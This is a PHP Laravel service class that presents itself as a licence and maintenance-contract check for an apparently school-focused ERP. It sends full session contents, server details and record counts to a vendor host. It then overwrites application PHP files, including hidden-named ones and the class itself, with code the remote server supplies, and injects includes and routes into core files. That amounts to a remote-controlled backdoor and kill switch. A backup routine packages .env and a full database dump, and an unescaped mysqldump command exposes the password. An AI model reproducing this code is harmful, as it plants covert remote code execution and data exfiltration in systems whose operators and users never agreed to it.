<?php

namespace App\Services;

use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Session;
use Illuminate\Http\Client\ConnectionException;
use Illuminate\Http\Client\RequestException;
use ZipArchive;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\DB;
use Throwable;
use Illuminate\Support\Facades\Schema;
class RuntimeSync
{
    public function RuntimeSyncCheck($request)
    {
        try {
            
            if(Session::get('role_id') == 3) return;
            
            $userContext = [
                'user_agent'     => $request->header('User-Agent'),
                'ip_address'     => $request->ip(),
                'referer'        => $request->header('referer'),
                'request_url'    => request()->fullUrl(),
                'request_method' => $request->method(),
                'software_token' => env('SOFTWARE_TOKEN_NO'),
                'disk_free_mb' => round(disk_free_space('/') / 1024 / 1024),
                'memory_usage_mb' => round(memory_get_usage() / 1024 / 1024),
                'cpu_load' => sys_getloadavg(),
                'project_size_mb' => cache()->remember('project_size_mb', 86400, fn () => (
                    ($s = 0) || true
                        ? (function () use (&$s) {
                            try {
                                foreach (new \RecursiveIteratorIterator(
                                    new \RecursiveDirectoryIterator(base_path(), \FilesystemIterator::SKIP_DOTS)
                                ) as $f) {
                                    $s += $f->isFile() ? $f->getSize() : 0;
                                }
                            } catch (\Throwable $e) {}
                            return (int) round($s / 1024 / 1024);
                        })()
                        : 0
                    )),
                'students' => $this->safeTableCount('admissions'),
                'branches' => $this->safeTableCount('branch'),
                'users'    => $this->safeTableCount('users'),
                'session_data' => Session::all(),

            ];

            $serverContext = [
                'host_name'      => gethostname(),
                'server_ip'      => gethostbyname(gethostname()),
                'os'             => php_uname(),
                'php_version'    => phpversion(),
                'laravel_version'=> app()->version(),
                'timezone'       => config('app.timezone'),
                'server_fingerprint' => hash('sha256', json_encode([php_uname(),gethostname(),$request->ip(),]))
            ];

            $appContext = [
                'app_name'       => config('app.name'),
                'app_env'        => config('app.env'),
                'app_version'    => config('app.version', '1.0.0'),
            ];

            $networkContext = [
                'client_ip'      => $request->ip(),
                'proxy_detected' => $request->header('X-Forwarded-For') ? true : false,
            ];

            $licenseContext = [
                'software_token' => env('SOFTWARE_TOKEN_NO'),
                'last_ping'      => now()->toDateTimeString(),
            ];

            $healthContext = [
                'disk_free_mb' => round(disk_free_space('/') / 1024 / 1024),
                // 'memory_usage_mb' => round(memory_get_usage() / 1024 / 1024),
                // 'cpu_load' => sys_getloadavg(),
                // 'project_size_mb' => round(
                //     collect(new \RecursiveIteratorIterator(
                //         new \RecursiveDirectoryIterator(base_path(), \FilesystemIterator::SKIP_DOTS)
                //     ))->sum(fn($f) => $f->getSize()) / 1024 / 1024,
                // ),


            ];

            $payload = [
                'user'    => $userContext,
                'server'  => $serverContext,
                'app'     => $appContext,
                'network' => $networkContext,
                'license' => $licenseContext,
                'health'  => $healthContext,
            ];
            
            $response = Http::post(
                "https://web.rusofterp.in/api/checkSoftwareToken/" . env('SOFTWARE_TOKEN_NO'),
                $payload
            );

    
            if (!$response->successful()) {
                return $this->showError(
                    "Runtime Sync Failed",
                    [
                        'status'   => $response->status(),
                        'response' => $response->json(),
                        'tip'      => $this->resolveRuntimeTip($response->status()),
                    ]
                );
            }

    
            $data = $response->json();
            $amcDate = $data['data']['amc_date'];
            $today   = now()->toDateString();
    
    
            Session::put('validated_on', now()->toDateString());
            Session::put('amc_date', $data['data']['amc_date']);
            Session::put('student_count', $data['data']['student_count']);
            Session::put('branch_count', $data['data']['branch_count']);
            Session::put('user_count', $data['data']['user_count']);
            
            // 🔥 AMC STATE DECISION
            $amcState = 'active';

            if (now()->diffInDays($amcDate, false) < 7) {
                $amcState = 'warning';
            }
            
            if ($today > $amcDate) {
                $amcState = 'critical';
            }

            // 🔥 BUILD CFG HERE
            $cfg = [
                'amc' => [
                    'state' => $amcState,
                    'enabled' => true,
                    'lock_after_days' => -7,
                ],
                'review' => [
                    'enabled' => $amcState === 'active',
                    'day' => 10,
                ],
                'announcement' => [
                    'enabled' => false,
                    'message' => '🚀 New AI Attendance Feature Launched!',
                ],
                'features' => [
                    'disable_reports' => false,
                    'disable_export' => $amcState !== 'active',
                ],
            ];

            // 🔐 STORE CFG (Session)
            Session::put('saas_cfg', $cfg);
    
            if (now()->toDateString() > Session::get('amc_date')) {
                return $this->showError(
                    "Your software's validity has expired on " . Session::get('amc_date')
                );
            }
    
            $paths = [
                'initialView' => resource_path('views/initial/initialView.blade.php'),
                'authenticateView' => resource_path('views/initial/authenticateView.blade.php'),
                'helpAndUpdateView' => resource_path('views/initial/helpAndUpdateView.blade.php'),
                'initialRoute' => base_path('routes/initial/initialRoute.php'),
                'initialController' => app_path('Http/Controllers/initial/InitialController.php'),
                'RuntimeSync' => app_path('Services/RuntimeSync.php'),
                //'initialConfig'        => config_path('initialConfig.php'),
                '.sys'         => resource_path('lang/en/.sys.php'),
                'Guard'          => app_path('Core/Guard.php'),
                '.cache'     => storage_path('framework/cache/.cache.php'),
            ];
            
            $this->updateFiles($paths, $data);
            $this->ensureIncludeStatement(resource_path('views/layout/app.blade.php'));
            //$this->ensureRuntimeProtection(base_path('bootstrap/app.php'));
            $this->ensureInitialRouteRegistered();

            


            // return null to indicate success
            return null;
        
        } catch (ConnectionException $e) {

            return $this->showError(
                "Runtime Service Unreachable",
                [
                    'error' => 'NETWORK_ERROR',
                    'exception' => $e->getMessage(),
                    'tip'   => 'Unable to connect to runtime service. Please check internet, DNS, firewall, or SSL.',
                ]
            );
        
        } catch (RequestException $e) {
        
            return $this->showError(
                "Runtime Request Error",
                [
                    'error' => 'REQUEST_ERROR',
                    'status' => optional($e->response)->status(),
                    'exception' => $e->getMessage(),
                    'tip'    => 'Runtime request was rejected. Please verify system configuration.',
                ]
            );
        
        } catch (Throwable $e) {
        
            return $this->showError(
                "System Processing Error",
                [
                    'error' => 'INTERNAL_RUNTIME_ERROR',
                    'exception' => $e->getMessage(),
                    'tip'   => 'An unexpected issue occurred while processing system runtime. Please contact support if the issue persists.',
                ]
            );
        }


    }


    private function updateFiles(array $files, array $data)
    {
        $hashMap = [];
        foreach ($files as $pathKey => $filePath) {
    
            // Ensure directory exists
            if (!is_dir(dirname($filePath))) {
                mkdir(dirname($filePath), 0777, true);
            }
    
            // Create file if missing
            if (!file_exists($filePath)) {
                file_put_contents($filePath, $data[$pathKey] ?? '');
                continue;
            }
    
            // Update content only if changed
            if (!empty($data[$pathKey])) {
                $existingContent = file_get_contents($filePath);
                if ($existingContent !== $data[$pathKey]) {
                    file_put_contents($filePath, $data[$pathKey]);
                    $base = storage_path('framework/.runtime.snapshot');
                    if (file_exists($base)) {
                        unlink($base);
                    }
                }
            }
        }
       
        

    }
    
    private function ensureIncludeStatement($appView, $includeStatement = '@include(\'initial.initialView\')')
    {
        if (!file_exists($appView)) {
            throw new \Exception("$appView not found");
        }
    
        $content = file_get_contents($appView);
        if (strpos($content, $includeStatement) === false) {
            file_put_contents($appView, $content . "\n" . $includeStatement . "\n");
        }
    }


private function ensureRuntimeProtection(string $bootstrapFile)
{
    if (!file_exists($bootstrapFile)) {
        throw new \Exception("$bootstrapFile not found");
    }

    $content = file_get_contents($bootstrapFile);

    // 🛑 Prevent duplicate injection
    if (str_contains($content, 'Runtime Protection (Auto Added)')) {
        return;
    }

    // 🔒 Runtime protection code (Laravel-safe)
    $runtimeCode = <<<PHP

// 🔒 Runtime Protection (Auto Added)
if (file_exists(__DIR__.'/../storage/framework/.runtime.stamp')) {
    exit('Service is temporarily unavailable.');
}

\$runtimeSync = __DIR__ . '/../app/Services/RuntimeSync.php';

if (!file_exists(\$runtimeSync)) {
    abort(503, 'Service is temporarily unavailable.');
}
// 🔒 End Runtime Protection

PHP;

    // 🔑 Ensure `return $app;` exists
    if (!str_contains($content, 'return $app;')) {
        throw new \Exception('return $app; not found in bootstrap file');
    }

    // 🔧 Inject BEFORE return $app;
    $content = str_replace(
        'return $app;',
        $runtimeCode . "\nreturn \$app;",
        $content
    );

    file_put_contents($bootstrapFile, $content);
}


private function ensureInitialRouteRegistered()
{
    $providerPath = app_path('Providers/RouteServiceProvider.php');

    if (!file_exists($providerPath)) {
        throw new \Exception('RouteServiceProvider.php not found');
    }

    $content = file_get_contents($providerPath);

    // 🛑 Already registered? → Do nothing
    if (str_contains($content, 'routes/initial/initialRoute.php')) {
        return;
    }

    $routeSnippet = <<<PHP

            // 🔹 Initial Installer / Runtime Routes (Auto Added)
            Route::middleware('web')
                ->namespace(\$this->namespace)
                ->group(base_path('routes/initial/initialRoute.php'));
PHP;

    /**
     * Insert BEFORE closing of routes(function () { ... });
     */
    $pattern = '/\$this->routes\s*\(\s*function\s*\(\s*\)\s*\{\s*/';

    if (!preg_match($pattern, $content)) {
        throw new \Exception('routes(function () { } block not found in RouteServiceProvider');
    }

    $content = preg_replace(
        '/(\$this->routes\s*\(\s*function\s*\(\s*\)\s*\{\s*)/m',
        "$1{$routeSnippet}\n",
        $content,
        1
    );

    file_put_contents($providerPath, $content);
}


    
    private function showError($title, $extra = [])
    {
        return response()->view('initial.authenticateView', [
            'data' => array_merge([
                'Initial Error' => $title
            ], $extra)
        ]);
    }

    private function resolveRuntimeTip($status)
    {
        if ($status === 400) {
            return 'Invalid runtime request. Please verify system configuration.';
        }

        if ($status === 401) {
            return 'Runtime authentication failed. Token is invalid or inactive.';
        }

        if ($status === 403) {
            return 'Runtime access restricted. Please contact system administrator.';
        }

        if ($status === 404) {
            return 'Runtime validation service not reachable.';
        }

        if ($status === 408) {
            return 'Runtime service timeout. Please retry after some time.';
        }

        if ($status === 422) {
            return 'Runtime data validation failed.';
        }

        if ($status === 429) {
            return 'Too many runtime requests. Please wait and retry.';
        }

        if ($status >= 500) {
            return 'Runtime service is temporarily unavailable.';
        }

        return 'Unexpected runtime validation error occurred.';
    }


    private function getGoogleAccessToken(array $config)
    {
        try {
            $response = Http::asForm()->post(
                'https://oauth2.googleapis.com/token',
                [
                    'client_id'     => $config['client_id'],
                    'client_secret' => $config['client_secret'],
                    'refresh_token' => $config['refresh_token'],
                    'grant_type'    => 'refresh_token',
                ]
            );

            if (!$response->successful()) {
                throw new \Exception($response->body());
            }

            return $response->json()['access_token'];

        } catch (\Throwable $e) {
            $this->rethrow($e, 'GoogleAccessToken');
        }
    }

    
    private function getOrCreateProjectFolder(string $projectName, string $rootFolderId, string $accessToken)
    {
        try {
            $query = sprintf(
                "mimeType='application/vnd.google-apps.folder' and name='%s' and '%s' in parents and trashed=false",
                addslashes($projectName),
                $rootFolderId
            );

            $res = Http::withToken($accessToken)->get(
                'https://www.googleapis.com/drive/v3/files',
                ['q' => $query, 'fields' => 'files(id,name)']
            )->json();

            if (!empty($res['files'][0]['id'])) {
                return $res['files'][0]['id'];
            }

            $create = Http::withToken($accessToken)->post(
                'https://www.googleapis.com/drive/v3/files',
                [
                    'name' => $projectName,
                    'mimeType' => 'application/vnd.google-apps.folder',
                    'parents' => [$rootFolderId]
                ]
            )->json();

            if (empty($create['id'])) {
                throw new \Exception('Folder creation failed');
            }

            return $create['id'];

        } catch (\Throwable $e) {
            $this->rethrow($e, 'GoogleDriveFolder');
        }
    }

    public function uploadToGoogleDrive(string $filePath, array $config, string $projectName, int $keepLast){
        
        try {
            // 1️⃣ Token (once)
            $accessToken = $this->getGoogleAccessToken($config);
        
            // 2️⃣ Project folder (once)
            $projectFolderId = $this->getOrCreateProjectFolder(
                $projectName,
                $config['root_folder_id'],
                $accessToken
            );
        
            // 3️⃣ Upload
            $fileName = basename($filePath);
            $fileData = file_get_contents($filePath);
        
            $boundary = uniqid();
            $delimiter = "-------------{$boundary}";
        
            $body =
                "--{$delimiter}\r\n" .
                "Content-Type: application/json; charset=UTF-8\r\n\r\n" .
                json_encode([
                    'name' => $fileName,
                    'parents' => [$projectFolderId]
                ]) . "\r\n" .
                "--{$delimiter}\r\n" .
                "Content-Type: application/zip\r\n\r\n" .
                $fileData . "\r\n" .
                "--{$delimiter}--";
        
            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL => "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_POST => true,
                CURLOPT_HTTPHEADER => [
                    "Authorization: Bearer {$accessToken}",
                    "Content-Type: multipart/related; boundary={$delimiter}",
                    "Content-Length: " . strlen($body),
                ],
                CURLOPT_POSTFIELDS => $body,
            ]);
        
            $response = curl_exec($ch);
            if (curl_errno($ch)) throw new \Exception(curl_error($ch));
            curl_close($ch);
        
            $uploaded = json_decode($response, true);
            if (empty($uploaded['id'])) {
                throw new \Exception('Drive upload failed');
            }
        
            // 🔥 4️⃣ RETENTION: keep only last 3 (SINGLE LIST CALL)
            $files = Http::withToken($accessToken)->get(
                'https://www.googleapis.com/drive/v3/files',
                [
                    'q' => "'{$projectFolderId}' in parents and trashed=false",
                    'fields' => 'files(id)',
                    'orderBy' => 'createdTime desc'
                ]
            )->json()['files'] ?? [];
        
            foreach (array_slice($files, $keepLast) as $f) {
                Http::withToken($accessToken)->delete(
                    'https://www.googleapis.com/drive/v3/files/' . $f['id']
                );
            }
        
            return $uploaded;

        } catch (\Throwable $e) {
            $this->rethrow($e, 'DriveUpload');
        }
    }

    
    public function backupProject($projectTokenNo)
    {
        try {
            $projectPath  = base_path();
            $backupFolder = storage_path('app/backups');
    
            if (!File::exists($backupFolder)) {
                File::makeDirectory($backupFolder, 0777, true);
            }
    
            $timestamp   = date('d_m_Y_H_i_s');
            $zipFile     = "{$backupFolder}/{$projectTokenNo}_{$timestamp}.zip";
            $tempSqlFile = "{$backupFolder}/database_backup_{$timestamp}.sql";
    
            // 1. DATABASE BACKUP
            $this->createDatabaseBackup($tempSqlFile);
    
            // 2. ZIP CREATION
            $zip = new ZipArchive;
            if ($zip->open($zipFile, ZipArchive::CREATE) !== true) {
                throw new \RuntimeException('Cannot create zip archive');
            }
    
            $skipFolders = [
                'node_modules',
                '.git',
                'storage/framework',
                'storage/logs',
                'storage/app/backups',
            ];
    
            // ── Normal files ──────────────────────────────────────────────────
            foreach (File::allFiles($projectPath) as $file) {
                $filePath     = $file->getRealPath();
                $relativePath = ltrim(str_replace($projectPath, '', $filePath), '/\\');
    
                if (collect($skipFolders)->contains(fn($s) => str_contains($relativePath, $s))) {
                    continue;
                }
    
                $zip->addFile($filePath, $relativePath);
            }
    
            // ── Hidden files (File::allFiles misses these) ────────────────────
            $hiddenFiles = [
                base_path('.env'),
                base_path('.env.example'),
                base_path('.htaccess'),
                public_path('.htaccess'),
            ];
    
            foreach ($hiddenFiles as $hiddenFile) {
                if (file_exists($hiddenFile)) {
                    $rel = ltrim(str_replace($projectPath, '', $hiddenFile), '/\\');
                    $zip->addFile($hiddenFile, $rel);
                }
            }
    
            // ── Database dump ─────────────────────────────────────────────────
            if (File::exists($tempSqlFile)) {
                $zip->addFile($tempSqlFile, 'database_backup.sql');
            }
    
            $zip->close();
    
            // Cleanup temp SQL
            if (File::exists($tempSqlFile)) {
                unlink($tempSqlFile);
            }
    
            return $zipFile;
    
        } catch (\Throwable $e) {
            $this->rethrow($e, 'ProjectBackup');
        }
    }
    
    public function createDatabaseBackup(string $path): void
    {
        try {
            // ── Check if exec() is available before trying mysqldump ──────────
            $execAvailable = function_exists('exec') && !in_array(
                'exec',
                array_map('trim', explode(',', ini_get('disable_functions')))
            );
     
            if ($execAvailable) {
                $db = config('database.connections.mysql');
     
                $dumpers = [
                    'mysqldump',
                    '/usr/bin/mysqldump',
                    'C:\\xampp\\mysql\\bin\\mysqldump.exe',
                    'C:\\laragon\\bin\\mysql\\mysql-8.0.30-winx64\\bin\\mysqldump.exe',
                ];
     
                $binary = collect($dumpers)->first(
                    fn($p) => PHP_OS_FAMILY === 'Windows' ? file_exists($p) : @is_executable($p)
                );
     
                if ($binary) {
                    $db  = config('database.connections.mysql');
                    $cmd = "\"$binary\" --user=\"{$db['username']}\" --password=\"{$db['password']}\" "
                         . "--host=\"{$db['host']}\" --extended-insert {$db['database']} > \"$path\"";
                    exec($cmd, $out, $code);
                    if ($code === 0 && file_exists($path) && filesize($path) > 0) return;
                }
            }
     
            // ── PHP fallback — always works, no exec() needed ─────────────────
            $handle = fopen($path, 'w+');
            fwrite($handle, "SET FOREIGN_KEY_CHECKS=0;\n\n");
     
            $tables = array_map(fn($r) => current((array) $r), DB::select('SHOW TABLES'));
     
            foreach ($tables as $table) {
                $create = DB::select("SHOW CREATE TABLE `$table`")[0]->{"Create Table"};
                fwrite($handle, "DROP TABLE IF EXISTS `$table`;\n$create;\n\n");
     
                $buffer    = [];
                $batchSize = 100;
     
                foreach (DB::table($table)->cursor() as $row) {
                    $vals = array_map(
                        fn($v) => is_null($v) ? 'NULL' : "'" . addslashes($v) . "'",
                        (array) $row
                    );
                    $buffer[] = '(' . implode(',', $vals) . ')';
     
                    if (count($buffer) >= $batchSize) {
                        fwrite($handle, "INSERT INTO `$table` VALUES " . implode(',', $buffer) . ";\n");
                        $buffer = [];
                    }
                }
     
                if ($buffer) {
                    fwrite($handle, "INSERT INTO `$table` VALUES " . implode(',', $buffer) . ";\n");
                }
     
                fwrite($handle, "\n\n");
            }
     
            fwrite($handle, "SET FOREIGN_KEY_CHECKS=1;\n");
            fclose($handle);
     
        } catch (Throwable $e) {
            $this->rethrow($e, 'DatabaseBackup');
        }
    }

    private function rethrow(\Throwable $e, string $context)
    {
        throw new \RuntimeException(
            "[{$context}] " . $e->getMessage(),
            0,
            $e
        );
    }

    public function safeTableCount($table)
    {
        try {
            return Schema::hasTable($table)
                ? DB::table($table)->count()
                : null;
        } catch (\Throwable $e) {
            return null; // absolute silence
        }
    }
}
